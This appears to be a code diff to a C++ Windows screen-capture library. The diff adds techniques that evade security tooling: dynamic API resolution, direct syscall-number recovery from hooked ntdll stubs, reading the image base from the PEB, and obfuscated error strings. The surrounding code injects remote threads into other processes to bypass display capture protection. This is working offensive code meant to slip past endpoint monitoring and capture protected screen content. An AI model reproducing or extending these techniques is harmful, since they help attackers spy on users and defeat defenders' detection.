@@ -1,5 +1,7 @@
 #include "thirdeye_core.h"
 #include "internal.h"
+#include "lge_syscalls.h"
+#include "dynresolve.h"
 #include <gdiplus.h>
 #include <iostream>
 #include <sstream>
@@ -27,7 +29,7 @@ HMODULE GetNtdllHandle() {
     static HMODULE hNtdll = nullptr;
     if (!hNtdll) {
         static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
-        hNtdll = GetModuleHandleA(DECR_STR(obfNtdll).c_str());
+        hNtdll = DynGetModuleHandle(DECR_STR(obfNtdll).c_str());
     }
     return hNtdll;
 }
@@ -43,72 +45,48 @@ DWORD GetSyscallNumber(const char* funcName) {
     if (pNt->Signature != IMAGE_NT_SIGNATURE) return 0;
     BYTE* pEnd = pBase + pNt->OptionalHeader.SizeOfImage;
 
-    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, funcName);
+    BYTE* pFunc = (BYTE*)DynGetProcAddress(hNtdll, funcName);
     if (!pFunc) return 0;
 
-    // mov r10, rcx; mov eax, <SSN> -> 4C 8B D1 B8 XX XX 00 00
-    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 && pFunc[3] == 0xB8) {
-        return *(DWORD*)(pFunc + 4);
+    auto IsCleanStub = [](const BYTE* s) {
+        return s[0] == 0x4C && s[1] == 0x8B && s[2] == 0xD1 && s[3] == 0xB8 &&
+               s[6] == 0x00 && s[7] == 0x00;
+    };
+    auto ReadSsn = [](const BYTE* s) -> WORD {
+        return (WORD)((s[5] << 8) | s[4]);
+    };
+
+    if (IsCleanStub(pFunc)) {
+        return ReadSsn(pFunc);
     }
 
-    constexpr int STUB_SIZE = 32;
+    const bool hookedAt0 = (pFunc[0] == 0xE9);
+    const bool hookedAt3 = (pFunc[3] == 0xE9);
+    if (!hookedAt0 && !hookedAt3) {
+        return 0;
+    }
+
+    constexpr int STUB_SIZE = 32;  
     constexpr int MAX_SEARCH = 500;
+    for (int idx = 1; idx <= MAX_SEARCH; idx++) {
 
-    for (int i = 1; i <= MAX_SEARCH; i++) {
-        BYTE* neighbor = pFunc - (i * STUB_SIZE);
-        if (neighbor < pBase || neighbor + 8 > pEnd) break;
-        if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 && neighbor[3] == 0xB8) {
-            return *(DWORD*)(neighbor + 4) + i;
+        BYTE* down = pFunc + (idx * STUB_SIZE);
+        if (down + 8 <= pEnd && IsCleanStub(down)) {
+            return (DWORD)(ReadSsn(down) - idx);
         }
-    }
 
-    for (int i = 1; i <= MAX_SEARCH; i++) {
-        BYTE* neighbor = pFunc + (i * STUB_SIZE);
-        if (neighbor + 8 > pEnd) break;
-        if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 && neighbor[3] == 0xB8) {
-            return *(DWORD*)(neighbor + 4) - i;
+        BYTE* up = pFunc - (idx * STUB_SIZE);
+        if (up >= pBase && up + 8 <= pEnd && IsCleanStub(up)) {
+            return (DWORD)(ReadSsn(up) + idx);
         }
     }
 
     return 0;
 }
 
-template<size_t N, unsigned char K>
-static DWORD GetSyscallNumberObf(const ObfString<N, K>& obf) {
-    char buf[N];
-    obf.deobfuscate(buf);
-    return GetSyscallNumber(buf);
-}
-
 bool InitializeSyscalls() {
-    static constexpr auto obfNtOpenProcess = MAKE_OBF("NtOpenProcess");
-    static constexpr auto obfNtAllocateVirtualMemory = MAKE_OBF("NtAllocateVirtualMemory");
-    static constexpr auto obfNtWriteVirtualMemory = MAKE_OBF("NtWriteVirtualMemory");
-    static constexpr auto obfNtFreeVirtualMemory = MAKE_OBF("NtFreeVirtualMemory");
-    static constexpr auto obfNtCreateThreadEx = MAKE_OBF("NtCreateThreadEx");
-    static constexpr auto obfNtClose = MAKE_OBF("NtClose");
-    static constexpr auto obfNtQueryInformationProcess = MAKE_OBF("NtQueryInformationProcess");
-    static constexpr auto obfNtWaitForSingleObject = MAKE_OBF("NtWaitForSingleObject");
-    static constexpr auto obfNtProtectVirtualMemory = MAKE_OBF("NtProtectVirtualMemory");
 
-    g_SysNtOpenProcess = GetSyscallNumberObf(obfNtOpenProcess);
-    g_SysNtAllocateVirtualMemory = GetSyscallNumberObf(obfNtAllocateVirtualMemory);
-    g_SysNtWriteVirtualMemory = GetSyscallNumberObf(obfNtWriteVirtualMemory);
-    g_SysNtFreeVirtualMemory = GetSyscallNumberObf(obfNtFreeVirtualMemory);
-    g_SysNtCreateThreadEx = GetSyscallNumberObf(obfNtCreateThreadEx);
-    g_SysNtClose = GetSyscallNumberObf(obfNtClose);
-    g_SysNtQueryInformationProcess = GetSyscallNumberObf(obfNtQueryInformationProcess);
-    g_SysNtWaitForSingleObject = GetSyscallNumberObf(obfNtWaitForSingleObject);
-    g_SysNtProtectVirtualMemory = GetSyscallNumberObf(obfNtProtectVirtualMemory);
-
-    if (g_SysNtOpenProcess == 0 || g_SysNtAllocateVirtualMemory == 0 ||
-        g_SysNtWriteVirtualMemory == 0 || g_SysNtFreeVirtualMemory == 0 ||
-        g_SysNtCreateThreadEx == 0 || g_SysNtClose == 0 ||
-        g_SysNtWaitForSingleObject == 0 || g_SysNtProtectVirtualMemory == 0) {
-        return false;
-    }
-
-    return true;
+    return LgeInitialize();
 }
 
 HANDLE NtOpenProcessDirect(DWORD pid, ACCESS_MASK desiredAccess) {
@@ -333,7 +311,7 @@ DWORD __stdcall RemoteThreadProc(LPVOID lpParameter) {
 
         for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
             const char* name = (const char*)(pBase + pNames[i]);
-            
+
             for (int t = 0; t < 4; t++) {
                 if (*results[t]) continue;
                 const char* s1 = name;
@@ -408,12 +386,14 @@ DWORD __stdcall RemoteThreadProc(LPVOID lpParameter) {
 #endif
 
 size_t GetRemoteSectionSize() {
-    HMODULE hMod = nullptr;
-    if (!GetModuleHandleExA(
-            GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
-            reinterpret_cast<LPCSTR>(&RemoteThreadProc),
-            &hMod) ||
-        !hMod) {
+
+#if defined(_M_X64) || defined(__x86_64__)
+    PPEB_FULL pPeb = (PPEB_FULL)__readgsqword(0x60);
+#else
+    PPEB_FULL pPeb = (PPEB_FULL)__readfsdword(0x30);
+#endif
+    HMODULE hMod = pPeb ? (HMODULE)pPeb->ImageBaseAddress : nullptr;
+    if (!hMod) {
         return 0;
     }
 
@@ -494,19 +474,19 @@ static bool BypassDisplayProtection(ThirdeyeContext* ctx, HANDLE hGlobalTrigger,
     size_t threadFailed = 0;
 
     if (!hGlobalTrigger) {
-        SetLastErrorMsg(ctx, "Invalid trigger event");
+        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Invalid trigger event")));
         return false;
     }
 
     HandleGuard hReadySemaphore(CreateSemaphoreA(nullptr, 0, 1000, nullptr));
     if (!hReadySemaphore) {
-        SetLastErrorMsg(ctx, "Failed to create ready semaphore");
+        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Failed to create ready semaphore")));
         return false;
     }
 
     size_t sectionSize = GetRemoteSectionSize();
     if (sectionSize == 0) {
-        SetLastErrorMsg(ctx, ".remote section not found");
+        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED(".remote section not found")));
         return false;
     }
 
@@ -663,20 +643,20 @@ static ThirdeyeResult CaptureScreenToStream(ThirdeyeContext* ctx, IStream* strea
     BitBlt(hdcMemDC, 0, 0, w, h, hdcScreen, x, y, SRCCOPY);
 
     Bitmap bitmap(hbm, nullptr);
-    
+
     CLSID clsid;
     const WCHAR* mimeType = GetMimeType(opts ? opts->format : THIRDEYE_FORMAT_JPEG);
     if (GetEncoderClsid(mimeType, &clsid) == -1) {
         DeleteObject(hbm);
         DeleteDC(hdcMemDC);
         ReleaseDC(nullptr, hdcScreen);
-        SetLastErrorMsg(ctx, "Image encoder not found");
+        SetLastErrorMsg(ctx, REVEAL_CSTR(SHRED("Image encoder not found")));
         return THIRDEYE_ERROR_ENCODER_NOT_FOUND;
     }
 
     EncoderParameters encoderParams;
     ULONG quality = opts ? (ULONG)opts->quality : 90;
-    
+
     if (opts && opts->format == THIRDEYE_FORMAT_JPEG) {
         encoderParams.Count = 1;
         encoderParams.Parameter[0].Guid = EncoderQuality;
@@ -757,7 +737,7 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToFile(
     if (!context) return THIRDEYE_ERROR_NOT_INITIALIZED;
 
     if (!filePath) {
-        SetLastErrorMsg(context, "Invalid file path");
+        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Invalid file path")));
         return THIRDEYE_ERROR_INVALID_PARAM;
     }
 
@@ -797,14 +777,14 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToFile(
     }
 
     Bitmap bitmap(hbm, nullptr);
-    
+
     CLSID clsid;
     const WCHAR* mimeType = GetMimeType(opts.format);
     if (GetEncoderClsid(mimeType, &clsid) == -1) {
         DeleteObject(hbm);
         DeleteDC(hdcMemDC);
         ReleaseDC(nullptr, hdcScreen);
-        SetLastErrorMsg(context, "Image encoder not found");
+        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Image encoder not found")));
         return THIRDEYE_ERROR_ENCODER_NOT_FOUND;
     }
 
@@ -827,7 +807,7 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToFile(
     ReleaseDC(nullptr, hdcScreen);
 
     if (saveStatus != Ok) {
-        SetLastErrorMsg(context, "Failed to save image");
+        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to save image")));
         return THIRDEYE_ERROR_SAVE_FAILED;
     }
 
@@ -843,7 +823,7 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToBuffer(
     if (!context) return THIRDEYE_ERROR_NOT_INITIALIZED;
 
     if (!buffer || !size) {
-        SetLastErrorMsg(context, "Invalid parameters");
+        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Invalid parameters")));
         return THIRDEYE_ERROR_INVALID_PARAM;
     }
 
@@ -874,7 +854,7 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToBuffer(
                 CleanupInjections(injections);
             }).detach();
         }
-        SetLastErrorMsg(context, "Failed to create memory stream");
+        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to create memory stream")));
         return THIRDEYE_ERROR_ALLOCATION_FAILED;
     }
 
@@ -895,7 +875,7 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToBuffer(
     STATSTG stat;
     if (stream->Stat(&stat, STATFLAG_NONAME) != S_OK) {
         stream->Release();
-        SetLastErrorMsg(context, "Failed to get stream size");
+        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to get stream size")));
         return THIRDEYE_ERROR_ALLOCATION_FAILED;
     }
 
@@ -904,7 +884,7 @@ THIRDEYE_API ThirdeyeResult THIRDEYE_CALL Thirdeye_CaptureToBuffer(
     uint8_t* outBuffer = (uint8_t*)malloc(dataSize);
     if (!outBuffer) {
         stream->Release();
-        SetLastErrorMsg(context, "Failed to allocate output buffer");
+        SetLastErrorMsg(context, REVEAL_CSTR(SHRED("Failed to allocate output buffer")));
         return THIRDEYE_ERROR_ALLOCATION_FAILED;
     }
 
